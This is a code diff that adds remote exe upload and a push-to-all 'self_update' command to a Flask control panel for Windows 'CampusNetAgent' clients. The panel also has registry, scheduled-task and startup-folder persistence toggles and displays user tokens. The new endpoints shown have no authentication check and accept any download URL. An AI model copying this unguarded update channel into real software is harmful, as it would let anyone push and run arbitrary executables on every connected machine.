@@ -219,6 +219,61 @@ def get_history():
     items.reverse()
     return jsonify(items)
 
+# ============ 远程更新: 文件托管 ============
+UPLOAD_DIR = os.path.join(DATA_DIR, "uploads")
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+@app.route("/api/upload_exe", methods=["POST"])
+def upload_exe():
+    """上传新版本 exe (面板操作)"""
+    f = request.files.get("file")
+    if not f:
+        return jsonify({"error": "no file"}), 400
+    filename = "CampusNetAgent.exe"
+    filepath = os.path.join(UPLOAD_DIR, filename)
+    f.save(filepath)
+    size_mb = os.path.getsize(filepath) / 1024 / 1024
+    _add_history("server", "上传新版本", f"{filename} ({size_mb:.1f}MB)")
+    return jsonify({"ok": True, "filename": filename, "size_mb": round(size_mb, 1),
+                    "url": f"/download/{filename}"})
+
+@app.route("/download/<path:filename>")
+def download_file(filename):
+    """提供 exe 下载 (Agent 自更新拉取)"""
+    from flask import send_from_directory
+    return send_from_directory(UPLOAD_DIR, filename)
+
+@app.route("/api/push_update", methods=["POST"])
+def push_update():
+    """向指定 Agent(s) 推送更新命令"""
+    data = request.json or {}
+    target = data.get("agents", [])  # agent_id 列表, 空=全部在线
+    version = data.get("version", "")
+    exe_path = os.path.join(UPLOAD_DIR, "CampusNetAgent.exe")
+    if not os.path.exists(exe_path):
+        return jsonify({"error": "未上传新版本 exe"}), 400
+    
+    # 构建下载URL: 使用请求的 Host 头
+    host = request.host
+    scheme = request.scheme
+    download_url = data.get("url", f"{scheme}://{host}/download/CampusNetAgent.exe")
+    
+    count = 0
+    with lock:
+        targets = target if target else [aid for aid, d in agents.items()
+                                         if d.get("alive") and (time.time() - d.get("last_seen", 0)) < 30]
+        for aid in targets:
+            cid = str(uuid.uuid4())[:8]
+            commands.setdefault(aid, []).append({
+                "id": cid,
+                "command": "self_update",
+                "params": {"url": download_url, "version": version},
+                "time": time.time(),
+            })
+            count += 1
+        _add_history("server", f"推送更新 v{version}", f"目标: {count} 个Agent")
+    return jsonify({"ok": True, "count": count})
+
 # ============ Web 面板 ============
 
 @app.route("/")
@@ -316,7 +371,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
   </div>
 
   <div class="section">
-    <h2>📡 设备列表</h2>
+    <h2 style="justify-content:space-between">📡 设备列表 <button class="btn" style="background:#dbeafe;color:#1d4ed8;font-size:12px" onclick="uploadAndPushAll()">📦 上传新版本 &amp; 全量推送</button></h2>
     <div class="agent-grid" id="agentGrid">
       <div class="empty">暂无 Agent 连接，请在客户端启动 agent.py</div>
     </div>
@@ -425,10 +480,28 @@ async function confirmAction(){
       }
     }
   }
+  // 读取 modal 数据 (在 closeModal 之前)
+  let _pushVer='',_pushUrl='',_blockCheck=true;
+  if(action==='__push_update__'){
+    _pushVer=document.getElementById('updateVer')?.value?.trim()||'';
+    _pushUrl=document.getElementById('updateUrl')?.value?.trim()||'';
+  }
+  if(action==='__delete__') _blockCheck=document.getElementById('blockCheck')?.checked??true;
   closeModal();
   if(action==='__delete__'){
-    const block=document.getElementById('blockCheck')?.checked??true;
-    await doDelete(agentId,block);
+    await doDelete(agentId,_blockCheck);
+  } else if(action==='__push_update__'){
+    const ver=_pushVer;
+    const url=_pushUrl;
+    let params2={version:ver};
+    if(url)params2.url=url;
+    try{
+      const r=await fetch(API+'/api/push_update',{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({agents:[agentId],version:ver,url:url||undefined})});
+      const j=await r.json();
+      if(j.ok)addLog(`已推送更新 v${ver} → ${agentId.substring(0,8)}...`,'ok');
+      else addLog(`推送失败: ${j.error}`,'err');
+    }catch(e){addLog(`推送错误: ${e}`,'err');}
   } else {
     await sendCmd(agentId,action,params);
   }
@@ -510,6 +583,48 @@ function setDns(agentId,hostname){
   },50);
 }
 
+async function uploadAndPushAll(){
+  const input=document.createElement('input');
+  input.type='file';
+  input.accept='.exe';
+  input.onchange=async()=>{
+    const file=input.files[0];
+    if(!file)return;
+    const ver=prompt('新版本号 (如 1.5):','');
+    if(ver===null)return;
+    addLog(`上传中: ${file.name} (${(file.size/1024/1024).toFixed(1)}MB)...`);
+    const fd=new FormData();
+    fd.append('file',file);
+    try{
+      const r=await fetch(API+'/api/upload_exe',{method:'POST',body:fd});
+      const j=await r.json();
+      if(!j.ok){addLog(`上传失败: ${j.error}`,'err');return;}
+      addLog(`上传成功: ${j.size_mb}MB`,'ok');
+      if(confirm(`上传成功! 是否推送更新 v${ver} 到所有在线 Agent?`)){
+        const r2=await fetch(API+'/api/push_update',{method:'POST',headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({version:ver})});
+        const j2=await r2.json();
+        if(j2.ok)addLog(`已推送到 ${j2.count} 个Agent`,'ok');
+        else addLog(`推送失败: ${j2.error}`,'err');
+      }
+    }catch(e){addLog(`上传错误: ${e}`,'err');}
+  };
+  input.click();
+}
+
+function pushUpdateSingle(agentId,hostname,currentVer){
+  pendingAction={agentId,action:'__push_update__'};
+  document.getElementById("modalTitle").textContent="📦 推送更新";
+  document.getElementById("modalMsg").innerHTML=
+    `设备: <b>${hostname}</b><br>`+
+    `当前版本: <b>v${currentVer||'?'}</b><br><br>`+
+    `<label style="font-size:13px">新版本号:</label><br>`+
+    `<input id="updateVer" type="text" placeholder="如 1.5" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:calc(100% - 26px)">`+
+    `<br><br><span style="font-size:12px;color:#9ca3af">需先上传新版本 exe (通过顶部 📦 按钮), 或输入自定义下载URL:</span><br>`+
+    `<input id="updateUrl" type="text" placeholder="留空则使用服务器托管的exe" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:calc(100% - 26px)">`;
+  document.getElementById("confirmModal").className="modal-overlay show";
+}
+
 async function sendCmd(agentId, cmd, params={}){
   addLog(`下发命令: ${cmd} → ${agentId.substring(0,8)}...`);
   try{
@@ -570,6 +685,7 @@ async function refresh(){
         <div class="info-row"><span class="k">🌐 DNS</span><span class="v" style="color:${a.dns_hijacked?'#dc2626':'#16a34a'}">${a.dns_hijacked?'⚠️ '+a.dns_servers:'自动(DHCP)'}</span></div>
         <div class="info-row"><span class="k">最后心跳</span><span class="v">${ago(a.last_seen)}</span></div>
         <div class="info-row"><span class="k">运行时间</span><span class="v">${a.uptime||"--"}</span></div>
+        <div class="info-row"><span class="k">📦 版本</span><span class="v">v${a.version||"?"}</span></div>
         <div class="autostart-row">
           <span class="label">🚀 开机自启 <span style="font-size:11px;color:#9ca3af;font-weight:400">${a.autostart_reg?"注册表✓":"注册表✗"} | ${a.autostart_task?"计划任务✓":"计划任务✗"} | ${a.autostart_lnk?"启动夹✓":"启动夹✗"}</span></span>
           <label class="toggle" onclick="toggleAutostart('${a.agent_id}','${a.hostname||a.agent_id}',${!!a.autostart})">
@@ -596,12 +712,13 @@ async function refresh(){
           <button class="btn" style="background:#ede9fe;color:#6d28d9" onclick="sendCmd('${a.agent_id}','start_watchdog')">👁️ 看门狗</button>
           <button class="btn" style="background:#450a0a;color:#fca5a5" onclick="confirmUninstall('${a.agent_id}','${a.hostname||a.agent_id}')">🗑️ 卸载</button>
           <button class="btn" style="background:#1f2937;color:#fff" onclick="deleteAgent('${a.agent_id}','${a.hostname||a.agent_id}')">❌ 删除</button>
+          <button class="btn" style="background:#dbeafe;color:#1d4ed8" onclick="pushUpdateSingle('${a.agent_id}','${a.hostname||a.agent_id}','${a.version||''}')">📦 推送更新</button>
         </div>
         <div class="token-box" id="tok-${a.agent_id}">${a.user_index||"无 token"}</div>
       </div>`;
     }).join("");
     // 只在内容变化时更新DOM (排除心跳时间等动态字段避免闪烁)
-    const stableKey=agents.map(a=>`${a.agent_id}|${a.status_cls}|${a.net_online}|${a.force_offline}|${a.autostart}|${a.autostart_reg}|${a.autostart_task}|${a.autostart_lnk}|${a.username}|${a.user_id}|${a.user_ip}|${a.campus_ip}|${a.local_ip}|${a.bandwidth_limit||''}|${a.dns_hijacked||''}|${a.dns_servers||''}`).join(";");
+    const stableKey=agents.map(a=>`${a.agent_id}|${a.status_cls}|${a.net_online}|${a.force_offline}|${a.autostart}|${a.autostart_reg}|${a.autostart_task}|${a.autostart_lnk}|${a.username}|${a.user_id}|${a.user_ip}|${a.campus_ip}|${a.local_ip}|${a.bandwidth_limit||''}|${a.dns_hijacked||''}|${a.dns_servers||''}|${a.version||''}`).join(";");
     if(stableKey!==grid._prevKey){grid.innerHTML=newHtml;grid._prevKey=stableKey;}
     else{
       // 只更新动态文本(心跳/运行时间)不重建DOM
